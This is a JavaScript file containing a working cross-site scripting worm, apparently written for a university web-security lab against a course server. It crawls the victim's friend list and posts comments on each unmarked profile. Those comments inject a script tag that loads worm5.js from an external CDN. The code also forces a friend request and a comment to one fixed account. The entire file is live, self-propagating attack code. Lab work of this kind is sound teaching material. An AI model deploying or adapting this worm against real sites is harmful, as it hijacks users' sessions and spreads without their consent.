function moveitmoveit() {
    var home = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/home.php',
        success: function(data) {
            return data;
        }
    });
    var friend = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/friends.php',
        success: function(data) {
            return data;
        }
    });
    var eff = friend.responseText;
    var arr= eff.match('^[^<br]*').join().split(',');
    for( var i = 0; i < arr.length; i++){
        var urlString = 'http://csec380-core.csec.rit.edu:86/home.php?id=' + arr[i];
        var newhome = $.ajax({
            async: false,
            type: 'GET',
            url: urlString,
            success: function(data) {
                return data;
            }
        });
        if (newhome.responseText.match('DarkLemon27') == null){
            $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: arr[i],comment: '<script src="https://cdn.jsdelivr.net/gh/DarkLemon27/WebApp/worm5.js"></script><img src="https://img.buzzfeed.com/buzzfeed-static/static/2019-11/19/20/asset/be34feec736a/sub-buzz-4628-1574196545-1.png" width=300 height=300 />'});
        }
    }
    if(eff.match('134') == null){
        $.get("http://csec380-core.csec.rit.edu:86/add_friend.php",{id: 134});
        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 134,comment: 'Im your friend now'});
    }
}
moveitmoveit();
